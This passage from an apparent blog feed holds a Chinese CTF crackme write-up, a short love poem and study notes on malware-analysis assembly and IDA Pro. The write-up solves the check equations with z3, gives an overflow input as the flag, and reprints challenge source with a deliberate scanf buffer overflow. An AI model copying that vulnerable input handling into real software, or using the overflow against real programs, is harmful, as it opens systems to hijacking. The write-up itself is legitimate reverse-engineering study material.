class="line">vaild_3</span><br><span class="line">00413665    8BC1            mov eax,ecx                </span><br><span class="line">0041365D    8BC1            mov eax,ecx</span><br><span class="line">004136A7    2BC2            sub eax,edx                </span><br><span class="line">004136D8    2D 683C0A0C     sub eax,0xC0A3C68</span><br><span class="line">00413703   /75 04           jnz short ctf2017_.00413709</span><br></pre></td></tr></table></figure></p><p>整理得到三个方程组</p><blockquote><p>((x - y) &lt;&lt; 2) + x + z == 0xEAF917E2<br>((x - y) &lt;&lt; 1) + (x - y) + x + z == 0xE8F508C8<br>((x - y) &lt;&lt; 1) + (x - y) + x - z == 0x0C0A3C68</p></blockquote><h2 id="利用z3约束求解器解方程"><a href="#利用z3约束求解器解方程" class="headerlink" title="利用z3约束求解器解方程"></a>利用z3约束求解器解方程</h2><p>Z3 is a theorem prover from Microsoft Research.<br>相关介绍和安装方法：  <a href="https://github.com/Z3Prover/z3" target="_blank" rel="noopener">https://github.com/Z3Prover/z3</a></p><p>源码如下<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding=utf-8</span><br><span class="line">from z3 import *</span><br><span class="line">x, y ,z = BitVecs(&apos;x y z&apos;, 64)</span><br><span class="line">#x = Real(&apos;x&apos;)</span><br><span class="line">#y = Real(&apos;y&apos;)</span><br><span class="line">#z = Real(&apos;z&apos;)</span><br><span class="line">solve(((x - y) &lt;&lt; 2) + x + z == 0xEAF917E2,((x - y) &lt;&lt; 1) + (x - y) + x + z == 0xE8F508C8,((x - y) &lt;&lt; 1) + (x - y) + x - z == 0x0C0A3C68)</span><br></pre></td></tr></table></figure></p><p>运行后得到结果<br><code>[z = 1853187632, y = 1919903280, x = 1953723722]</code><br>转换为16进制<br>x = 0x7473754a<br>y = 0x726f6630<br>z = 0x6e756630</p><p>连起来转换为字符串<br><img src="https://i.loli.net/2018/07/16/5b4c653dd528d.jpg" alt="mark"><br>倒过来就是Just0for0fun<br>再加上溢出要用的11A<br>所以<br>flag=Just0for0fun11A</p><p><img src="https://i.loli.net/2018/07/16/5b4c653de79c8.jpg" alt="mark"></p><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><p><a href="https://bbs.pediy.com/thread-222404.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-222404.htm</a></p><h3 id="主体-VC6"><a href="#主体-VC6" class="headerlink" title="主体(VC6)"></a>主体(VC6)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line"> </span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">extern &quot;C&quot; &#123;</span><br><span class="line">#endif</span><br><span class="line"> </span><br><span class="line">int __cdecl Add3(int, int);                                 // proc in asm obj</span><br><span class="line">char * __cdecl very2();                                     // right verify proc, in asm obj, @413131</span><br><span class="line"> </span><br><span class="line">#ifdef __cplusplus</span><br><span class="line">&#125; /* extern &quot;C&quot; */</span><br><span class="line">#endif</span><br><span class="line"> </span><br><span class="line">inline void G()&#123; printf(&quot;You get it!\n&quot;);&#125;                  // show good msg, will not have a chance to run</span><br><span class="line">inline void B()&#123; printf(&quot;Bad register-code, keep trying.\n&quot;);&#125;  // show err msg</span><br><span class="line"> </span><br><span class="line">char * InputKey();                                          // get register code, in stack</span><br><span class="line">void very1();                                               // fake verify proc 1</span><br><span class="line">void very3();                                               // fake verify proc 3</span><br><span class="line">int Flag=0x21;                                              // register flag, 21 is a bad-guy</span><br><span class="line">extern &quot;C&quot; int cFlag=0x11;                                  // anti-wrong jump flag</span><br><span class="line"> </span><br><span class="line">&lt;br&gt;</span><br><span class="line">int main(int argc, char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;\n Crackme for CTF2017 @Pediy.\n&quot;);             // show welcome msg</span><br><span class="line">    char Key0[10];                                          // local var, never use</span><br><span class="line">    char *p1;                                               // pointor to stack var, useless</span><br><span class="line">    cFlag=2;</span><br><span class="line">    p1=InputKey();                                          // get register code, it must over-flow to very2()</span><br><span class="line">    //printf(&quot;%s\n&quot;, p1);</span><br><span class="line">    very1();                                                // useless</span><br><span class="line">    very3();                                                // useless</span><br><span class="line">    if(cFlag==0)</span><br><span class="line">        G();</span><br><span class="line">    else</span><br><span class="line">        B();                                        // boom! bad cracker, just wonder where to verify it???</span><br><span class="line">    //getch();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">char * InputKey()                                           // get register code, it must over-flow to very2(), which is coded in ASM, with junk-code</span><br><span class="line">                                                            // dword1 dword2 dword3 11A (address of very2, @413131 )</span><br><span class="line">&#123;</span><br><span class="line">    char Key[10];</span><br><span class="line">    char *p2;</span><br><span class="line">    p2=(char *)&amp;Key;</span><br><span class="line">    printf(&quot; Coded by Fpc.\n\n&quot;);</span><br><span class="line">    printf(&quot; Please input your code: &quot;);</span><br><span class="line">    scanf(&quot;%s&quot;, Key);</span><br><span class="line">    return p2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="两个fake函数-asm"><a href="#两个fake函数-asm" class="headerlink" title="两个fake函数(asm)"></a>两个fake函数(asm)</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __declspec(naked) very1()                                              // useless</span><br><span class="line">&#123;</span><br><span class="line">    long int x, y, z;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push    ebp</span><br><span class="line">        mov     ebp, esp</span><br><span class="line">        //mov       eax, esp</span><br><span class="line">        //sub       eax, 8</span><br><span class="line">        //mov       edx, [eax]</span><br><span class="line">        //mov       [ebp-4], edx</span><br><span class="line">        //mov       edx, [eax+4]</span><br><span class="line">        //mov       [ebp-8], edx</span><br><span class="line">        mov     ecx, [ebp-4]</span><br><span class="line">        test        ecx, ecx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     edx, [ebp-8]</span><br><span class="line">        test        edx, edx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     eax, ecx</span><br><span class="line">        sub     eax, edx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     [ebp-0x0c], eax</span><br><span class="line">        imul        eax,  5</span><br><span class="line">        add     ecx, eax</span><br><span class="line">        cmp     ecx, 0x08f503a42</span><br><span class="line">        jnz     end1</span><br><span class="line">        mov     eax, [ebp-0x0c]</span><br><span class="line">        imul        eax, 13</span><br><span class="line">        add     edx, eax</span><br><span class="line">        cmp     edx, 0x0ef503a42</span><br><span class="line">        jnz     end1</span><br><span class="line">        mov     edx, 0x543f30                               // dec flag, anti ida x-ref trick</span><br><span class="line">        xor     edx, 0x158f04</span><br><span class="line">        mov     eax, [edx]</span><br><span class="line">        dec     eax</span><br><span class="line">        mov     [edx], eax</span><br><span class="line">        //mov       cFlag, eax</span><br><span class="line">    //if (x==0)</span><br><span class="line">    //  goto end1;</span><br><span class="line">    //if (y==0)</span><br><span class="line">    //  goto end1;</span><br><span class="line">    //z=x-y;</span><br><span class="line">    //if (z==0)</span><br><span class="line">    //      goto end1;</span><br><span class="line">    //if( ((x+z*5)==0x08f503a42) &amp;&amp; ((y+z*13)==0x0ef503a42) )</span><br><span class="line">    //  G();</span><br><span class="line">end1:</span><br><span class="line">        mov     esp, ebp</span><br><span class="line">        pop     ebp</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">    //return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>和<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void __declspec(naked) very3()                                              // useless</span><br><span class="line">&#123;</span><br><span class="line">    long int x, y, z;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push    ebp</span><br><span class="line">        mov     ebp, esp</span><br><span class="line">        mov     ecx, [ebp-4]</span><br><span class="line">        test        ecx, ecx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     edx, [ebp-8]</span><br><span class="line">        test        edx, edx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     eax, ecx</span><br><span class="line">        sub     eax, edx</span><br><span class="line">        jz      end1</span><br><span class="line">        mov     [ebp-0x0c], eax</span><br><span class="line">        imul        eax,  17</span><br><span class="line">        add     ecx, eax</span><br><span class="line">        cmp     ecx, 0x0f3a94883</span><br><span class="line">        jnz     end1</span><br><span class="line">        mov     eax, [ebp-0x0c]</span><br><span class="line">        imul        eax, 7</span><br><span class="line">        add     edx, eax</span><br><span class="line">        cmp     edx, 0x033a94883</span><br><span class="line">        jnz     end1</span><br><span class="line">        mov     edx, 0x543f30</span><br><span class="line">        xor     edx, 0x158f04</span><br><span class="line">        mov     eax, [edx]</span><br><span class="line">        dec     eax</span><br><span class="line">        mov     [edx], eax</span><br><span class="line">end1:</span><br><span class="line">        mov     esp, ebp</span><br><span class="line">        pop     ebp</span><br><span class="line">        ret</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="验证部分-masm"><a href="#验证部分-masm" class="headerlink" title="验证部分(masm)"></a>验证部分(masm)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public  c very2     ;声明引出的proc</span><br><span class="line"> </span><br><span class="line">extern  cFlag:near</span><br><span class="line"> </span><br><span class="line">.code</span><br><span class="line">    db 10000 dup(0)             ; pushing addr of very2 to 413131 in exe-file</span><br><span class="line">    db 2000h  dup(0)</span><br><span class="line"> </span><br><span class="line">    db 0c3                  ; ret, give some sign for crackerz</span><br><span class="line">                        ;</span><br><span class="line">very2   proc    near c              ; right verify proc here, at 413131</span><br><span class="line">    add esp, -10                ; restore esp, crack must input:0c bytes regcode and addr of very2</span><br><span class="line">    xor eax, eax</span><br><span class="line">    mov DWORD ptr cFlag, eax</span><br><span class="line">    ;</span><br><span class="line">    ; check register code</span><br><span class="line">    ; correct register code at stack:</span><br><span class="line">    ;       Just_for_fun + 11A(addr of very2)</span><br><span class="line">    ;</span><br><span class="line">    ;解个三元一次方程</span><br><span class="line">    ;5x-4y+z=A</span><br><span class="line">    ;4x-3y+z=B</span><br><span class="line">    ;4x-3y-z=C</span><br><span class="line">    ;</span><br><span class="line">    pop eax</span><br><span class="line">    mov ecx, eax        ;eax=x      7473754a</span><br><span class="line">    pop eax         ;eax=y      726f6630</span><br><span class="line">    mov ebx, eax</span><br><span class="line">    pop eax         ;z      6e756630</span><br><span class="line">    mov edx, eax</span><br><span class="line">    mov eax, ecx        ;x</span><br><span class="line">    sub eax, ebx        ;x-y        2040f1a</span><br><span class="line">    shl eax, 2      ;4(x-y)     8103c68</span><br><span class="line">    add eax, ecx        ;x=x+4(x-y) 7c83b1b2</span><br><span class="line">    add eax, edx        ;x=x+4(x-y)+z   eaf917e2</span><br><span class="line">    sub eax, 0eaf917e2  ;A</span><br><span class="line">    jnz bad_boy</span><br><span class="line">    add eax, ecx</span><br><span class="line">    sub eax, ebx        ;x-y</span><br><span class="line">    mov ebx, eax</span><br><span class="line">    shl eax, 1</span><br><span class="line">    add eax, ebx        ;3(x-y)     60c2d4e</span><br><span class="line">    add eax, ecx        ;x+3(x-y)</span><br><span class="line">    mov ecx, eax        ;x+3(x-y)   7a7fa298</span><br><span class="line">    add eax, edx        ;x+3(x-y)+z e8f508c8</span><br><span class="line">    sub eax, 0e8f508c8  ;B</span><br><span class="line">    jnz bad_boy</span><br><span class="line">    mov eax, ecx</span><br><span class="line">    sub eax, edx        ;x+3(x-y)-z c0a3c68</span><br><span class="line">    sub eax, 0c0a3c68   ;C</span><br><span class="line">    jnz bad_boy</span><br><span class="line">    ;</span><br><span class="line">    ;eax=0</span><br><span class="line">    ;ebx=02040f1a</span><br><span class="line">    ;ecx=7a7fa298</span><br><span class="line">    ;edx=6e756630</span><br><span class="line">    pop eax         ; balance stack, eax=413131</span><br><span class="line">    ;set flag to 0, show good cracker msg</span><br><span class="line">    xor eax, 8101       ;eax=41b030, addr of flag</span><br><span class="line">    mov edi, eax</span><br><span class="line">    xor eax, eax</span><br><span class="line">    stosd           ;set flag</span><br><span class="line">    call @f</span><br><span class="line">    ;buffer for good message: &quot;You get it!&quot;, in 3 dwords</span><br><span class="line">    dd 0050600e8, 1702,1702</span><br><span class="line">@@:</span><br><span class="line">    ; recover good message in code segment</span><br><span class="line">    pop eax</span><br><span class="line">    push eax</span><br><span class="line">    mov edi, eax</span><br><span class="line">    ;push 20756f59</span><br><span class="line">    push 4e000969           ;first dword</span><br><span class="line">    pop eax</span><br><span class="line">    ;use ebx,edx value</span><br><span class="line">    xor eax, edx</span><br><span class="line">    stosd</span><br><span class="line">    ;push 20746567</span><br><span class="line">    xor eax, 10a3e          ;second dword</span><br><span class="line">    stosd</span><br><span class="line">    ;push 217469</span><br><span class="line">    xor eax, ebx            ;22706b8c, third dword</span><br><span class="line">    xor eax, 22511e14</span><br><span class="line">    stosd</span><br><span class="line">    ;mov eax, 401044</span><br><span class="line">    xor eax, 61642d</span><br><span class="line">    jmp ret1</span><br><span class="line">bad_boy:</span><br><span class="line">    ;mov eax, 40103f</span><br><span class="line">    pop eax         ;eax=413131, addr of very2</span><br><span class="line">    xor eax, 1210e</span><br><span class="line">ret1:</span><br><span class="line">    xor eax, DWORD ptr cFlag</span><br><span class="line">    jmp eax</span><br><span class="line">    nop</span><br><span class="line">    ;ret</span><br><span class="line"> </span><br><span class="line">very2   endp</span><br></pre></td></tr></table></figure><hr><p>完结</p><p>From <a href="https://kabeor.github.io/看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc/">https://kabeor.github.io/看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;看雪-TSRC-2017CTF秋季赛-ctf2017-Fpc&quot;&gt;&lt;a href=&quot;#看雪-TSRC-2017CTF秋季赛-ctf2017-Fpc&quot; class=&quot;headerlink&quot; title=&quot;看雪.TSRC 2017CTF秋季赛 ctf2017_Fpc&quot;&gt;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向，缓冲区溢出" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91%EF%BC%8C%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
  <entry>
    <title>Miss You</title>
    <link href="https://kabeor.github.io/Miss%20You/"/>
    <id>https://kabeor.github.io/Miss You/</id>
    <published>2018-04-22T11:30:52.362Z</published>
    <updated>2018-07-16T09:31:35.383Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Miss-You"><a href="#Miss-You" class="headerlink" title="Miss You"></a>Miss You</h1><hr><blockquote><p>思念你的眼眸，是从那一刻<br>悄然开始的</p><p>情不知所起，一往而深</p><p>清风湿润，茶烟轻扬<br>汝携芳华，踏入吾梦<br>一花一草，一木一字<br>满天星辰，何不是你</p><p>思念一重一重<br>点缀万家灯火<br>眷恋一天一天<br>跨过寒暑昏昼</p><p>It ‘s sweet of that sugar<br>Cherish every second spend with you<br>Don’t doubt<br>That’s how you make me feel</p><p>Everybody knows I love you bady</p><p>The faster time passes, the more I miss you</p></blockquote><hr><p>为七天前的你写下这段话</p><p>2018/4/22 19:31:16 </p><p>From <a href="https://kabeor.github.io/Miss You/">https://kabeor.github.io/Miss You/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Miss-You&quot;&gt;&lt;a href=&quot;#Miss-You&quot; class=&quot;headerlink&quot; title=&quot;Miss You&quot;&gt;&lt;/a&gt;Miss You&lt;/h1&gt;&lt;hr&gt;
&lt;blockquote&gt;
&lt;p&gt;思念你的眼眸，是从那一刻&lt;br&gt;悄然开始的&lt;/p&gt;
&lt;p
      
    
    </summary>
    
    
      <category term="You" scheme="https://kabeor.github.io/tags/You/"/>
    
  </entry>
  
  <entry>
    <title>第6章 识别汇编中的C代码结构</title>
    <link href="https://kabeor.github.io/%E7%AC%AC6%E7%AB%A0%20%E8%AF%86%E5%88%AB%E6%B1%87%E7%BC%96%E4%B8%AD%E7%9A%84C%E4%BB%A3%E7%A0%81%E7%BB%93%E6%9E%84/"/>
    <id>https://kabeor.github.io/第6章 识别汇编中的C代码结构/</id>
    <published>2018-04-11T12:54:08.643Z</published>
    <updated>2018-07-19T05:20:52.530Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第6章-识别汇编中的C代码结构"><a href="#第6章-识别汇编中的C代码结构" class="headerlink" title="第6章 识别汇编中的C代码结构"></a>第6章 识别汇编中的C代码结构</h1><h2 id="6x1-全局与局部变量"><a href="#6x1-全局与局部变量" class="headerlink" title="6x1 全局与局部变量"></a>6x1 全局与局部变量</h2><blockquote><p>全局变量可以被一个程序中的任意函数访问和使用<br>局部变量只能在它被定义的函数中访问</p></blockquote><p>在反汇编代码中： </p><p><strong>全局变量通过内存地址引用</strong><br><strong>局部变量通过栈地址引用</strong></p><h2 id="6x2-反汇编算术操作"><a href="#6x2-反汇编算术操作" class="headerlink" title="6x2 反汇编算术操作"></a>6x2 反汇编算术操作</h2><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f7218cec.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f724a277.jpg" alt="mark"></p></blockquote><p>反汇编中，1~2行为赋值，3~5行为a=a+11，6~9行为a=a-b，10~12和13~15分别为a–和b++，16~19为b=a%3</p><h2 id="6x3-识别if语句"><a href="#6x3-识别if语句" class="headerlink" title="6x3 识别if语句"></a>6x3 识别if语句</h2><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f7260e22.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f72760c1.jpg" alt="mark"></p></blockquote><p>cmp比较var_4是否等于var_8</p><h3 id="1-用IDA-Pro图形化分析函数"><a href="#1-用IDA-Pro图形化分析函数" class="headerlink" title="1. 用IDA Pro图形化分析函数"></a>1. 用IDA Pro图形化分析函数</h3><p><img src="https://i.loli.net/2018/07/19/5b501f72992fc.jpg" alt="mark"></p><h3 id="2-识别嵌套的if语句"><a href="#2-识别嵌套的if语句" class="headerlink" title="2. 识别嵌套的if语句"></a>2. 识别嵌套的if语句</h3><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f72ad72e.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f72d0602.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b501f72e9ab6.jpg" alt="mark"></p></blockquote><h2 id="6x4-识别循环"><a href="#6x4-识别循环" class="headerlink" title="6x4 识别循环"></a>6x4 识别循环</h2><h3 id="1-找到for循环"><a href="#1-找到for循环" class="headerlink" title="1. 找到for循环"></a>1. 找到for循环</h3><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f7312652.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f7381097.jpg" alt="mark"></p><p><strong>IDA Pro图形化</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f86da225.jpg" alt="mark"></p></blockquote><p>汇编代码中，for循环可通过以下4个组件识别出来</p><blockquote><p>初始化<br>比较<br>执行指令<br>递增/递减</p></blockquote><h3 id="2-找到while循环"><a href="#2-找到while循环" class="headerlink" title="2. 找到while循环"></a>2. 找到while循环</h3><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f8751178.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f8764b45.jpg" alt="mark"></p></blockquote><p>汇编代码和for循环非常相似，唯一区别在于它缺少一个递增</p><h2 id="6x5-理解函数调用约定"><a href="#6x5-理解函数调用约定" class="headerlink" title="6x5 理解函数调用约定"></a>6x5 理解函数调用约定</h2><blockquote><p><strong>一个函数调用的伪代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f8779503.jpg" alt="mark"></p></blockquote><p>最常见的三个调用约定：cdecl，stdcall，fastcall</p><h3 id="1-cdecl"><a href="#1-cdecl" class="headerlink" title="1. cdecl"></a>1. cdecl</h3><p><img src="https://i.loli.net/2018/07/19/5b501f879153f.jpg" alt="mark"></p><p>在cdecl约定中，参数从右到左按序被压入栈，当函数完成时由调用者清理栈。</p><h3 id="2-stdcall"><a href="#2-stdcall" class="headerlink" title="2. stdcall"></a>2. stdcall</h3><p>stdcall是Windows API的标准调用约定。任何调用这些API的代码都不需要清理栈，清理栈由实现API函数代码的DLL程序所承担</p><h3 id="3-fastcall"><a href="#3-fastcall" class="headerlink" title="3. fastcall"></a>3. fastcall</h3><p>在fastcall中，前面的一些参数被传到寄存器，备用的寄存器是EDX和ECX。如果需要，剩下的参数再以从右到左的次序被加载到栈上。<br>使用fastcall比其他约定更高效，因为代码不需要涉及过多的栈操作</p><h3 id="4-压栈与移动"><a href="#4-压栈与移动" class="headerlink" title="4. 压栈与移动"></a>4. 压栈与移动</h3><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f87a906f.jpg" alt="mark"></p><p><strong>adder函数汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f87c20db.jpg" alt="mark"></p><p><strong>使用两种不同调用约定时一个函数调用的汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f87d5f2a.jpg" alt="mark"></p></blockquote><h2 id="6x6-分析switch语句"><a href="#6x6-分析switch语句" class="headerlink" title="6x6 分析switch语句"></a>6x6 分析switch语句</h2><p>switch语句通常以两种方式被编译：</p><ol><li>if样式</li><li>跳转表</li></ol><h3 id="1-if样式"><a href="#1-if样式" class="headerlink" title="1. if样式"></a>1. if样式</h3><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f87e703c.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f880c31f.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b501f9daa16e.jpg" alt="mark"></p><p><strong>IDA Pro图形化</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9dd4356.jpg" alt="mark"></p></blockquote><h3 id="2-跳转表"><a href="#2-跳转表" class="headerlink" title="2. 跳转表"></a>2. 跳转表</h3><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9dece2d.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9e12198.jpg" alt="mark"></p><p><strong>IDA Pro图形化</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9e36c12.jpg" alt="mark"></p></blockquote><h2 id="6x7-反汇编数组"><a href="#6x7-反汇编数组" class="headerlink" title="6x7 反汇编数组"></a>6x7 反汇编数组</h2><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9e4d524.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9e62590.jpg" alt="mark"></p></blockquote><p>数组a的基地址对应var_14，数组b的基地址对应dword_40A000.</p><p>ecx被作为索引使用，它被乘以4，来指明元素的大小，结果值与数组的基地址相加，来访问正确的数组元素。</p><h2 id="6x8-识别结构体"><a href="#6x8-识别结构体" class="headerlink" title="6x8 识别结构体"></a>6x8 识别结构体</h2><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9e7869e.jpg" alt="mark"></p><p><strong>main函数反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9e8ef54.jpg" alt="mark"></p><p><strong>test函数反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501f9ea93bc.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b501faf4c785.jpg" alt="mark"></p></blockquote><p>arg_0是这个结构体的基地址，偏移0x14保存了结构中的字符，并且0x61对应ASCII中的字母a</p><h2 id="6x9-分析链表遍历"><a href="#6x9-分析链表遍历" class="headerlink" title="6x9 分析链表遍历"></a>6x9 分析链表遍历</h2><blockquote><p><strong>C代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501faf632ab.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b501faf7be8b.jpg" alt="mark"></p><p><strong>反汇编代码</strong></p><p><img src="https://i.loli.net/2018/07/19/5b501faf96083.jpg" alt="mark"><br><img src="https://i.loli.net/2018/07/19/5b501fafb3fab.jpg" alt="mark"></p></blockquote><p>var_C对应i，它是这个循环的计数。<br>var_8对应head变量。<br>var_4是一个指向拥有两个被赋值变量结构体的指针</p><p>From <a href="https://kabeor.github.io/第6章 识别汇编中的C代码结构/">https://kabeor.github.io/第6章 识别汇编中的C代码结构/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第6章-识别汇编中的C代码结构&quot;&gt;&lt;a href=&quot;#第6章-识别汇编中的C代码结构&quot; class=&quot;headerlink&quot; title=&quot;第6章 识别汇编中的C代码结构&quot;&gt;&lt;/a&gt;第6章 识别汇编中的C代码结构&lt;/h1&gt;&lt;h2 id=&quot;6x1-全局与局部变量&quot;&gt;
      
    
    </summary>
    
      <category term="病毒分析" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
      <category term="《恶意代码分析实战》笔记" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/"/>
    
      <category term="第二篇 静态分析高级技术篇" scheme="https://kabeor.github.io/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E3%80%8A%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E3%80%8B%E7%AC%94%E8%AE%B0/%E7%AC%AC%E4%BA%8C%E7%AF%87-%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90%E9%AB%98%E7%BA%A7%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    
      <category term="病毒分析" scheme="https://kabeor.github.io/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第5章 IDA Pro</title>
    <link href="https://kabeor.github.io/%E7%AC%AC5%E7%AB%A0%20IDA%20Pro/"/>
    <id>https://kabeor.github.io/第5章 IDA Pro/</id>
    <published>2018-04-01T11:00:07.280Z</published>
    <updated>2018-07-19T05:18:43.943Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第5章-IDA-Pro"><a href="#第5章-IDA-Pro" class="headerlink" title="第5章 IDA Pro"></a>第5章 IDA Pro</h1><p>本章介绍了IDA Pro的使用方法，本文就只大致记录常用功能</p><h2 id="5x1-加载一个可执行文件"><a href="#5x1-加载一个可执行文件" class="headerlink" title="5x1 加载一个可执行文件"></a>5x1 加载一个可执行文件</h2><p>默认情况下，IDA Pro反汇编代码中不包含PE头或资源节，这些地方常被恶意代码用来隐藏恶意指令，我们可以指定手动加载</p><h2 id="5x2-IDA-Pro接口"><a href="#5x2-IDA-Pro接口" class="headerlink" title="5x2 IDA Pro接口"></a>5x2 IDA Pro接口</h2><h3 id="1-反汇编窗口模式"><a href="#1-反汇编窗口模式" class="headerlink" title="1. 反汇编窗口模式"></a>1. 反汇编窗口模式</h3><blockquote><p>图形模式</p></blockquote><p>显示行号的操作码：Options-&gt;General，选择Line prefixes并设置Number of Opcode Bytes为6.（如果这些设置让所有指令都在屏幕右对齐，尝试设置Instruction Indentation为8）</p><p>箭头颜色：</p><ol><li>红色：一个条件跳转没有被采用</li><li>绿色：这个条件跳转被采用</li><li>蓝色：一个无条件跳转被采用</li></ol><blockquote><p>文本模式</p></blockquote><p>打开自动注释： Options-&gt;General，选择Auto comments</p><h3 id="2-对分析有用的窗口"><a href="#2-对分析有用的窗口" class="headerlink" title="2. 对分析有用的窗口"></a>2. 对分析有用的窗口</h3><blockquote><p>函数窗口<br>名字窗口<br>字符串窗口<br>导入表窗口<br>导入表窗口<br>结构窗口</p></blockquote><h3 id="3-返回到默认窗口"><a href="#3-返回到默认窗口" class="headerlink" title="3. 返回到默认窗口"></a>3. 返回到默认窗口</h3><p>Windows-&gt;Reset Desktop<br>Windows-&gt;Save desktop   保存新视图</p><h3 id="4-导航IDA-Pro"><a href="#4-导航IDA-Pro" class="headerlink" title="4. 导航IDA Pro"></a>4. 导航IDA Pro</h3><blockquote><p>使用链接和交叉引用<br>浏览历史<br>导航栏</p><pre><code>1. 浅蓝色： 被FLIRT识别的库代码2. 红色： 编译器生成的代码3. 深蓝色： 用户编写的代码4. 粉红色： 导入的数据5. 灰色： 已定义的数据6. 棕色： 未定义的数据</code></pre><p>跳转到位置   <strong>G</strong></p></blockquote><h3 id="5-搜索"><a href="#5-搜索" class="headerlink" title="5. 搜索"></a>5. 搜索</h3><blockquote><p>Search-&gt;Next Code  移动光标到包含你所指定的指令的下一个位置<br>Search-&gt;Text  在整个反汇编窗口中搜索一个指定的字符串<br>Search-&gt;Sequence of Bytes  在十六进制视图窗口中对一个特定字节序列执行二进制搜索</p></blockquote><h2 id="5x3-使用交叉引用"><a href="#5x3-使用交叉引用" class="headerlink" title="5x3 使用交叉引用"></a>5x3 使用交叉引用</h2><p>交叉引用（xref）<br>查看一个函数的所有交叉引用：单机函数名并按X键</p><h2 id="5x4-分析函数"><a href="#5x4-分析函数" 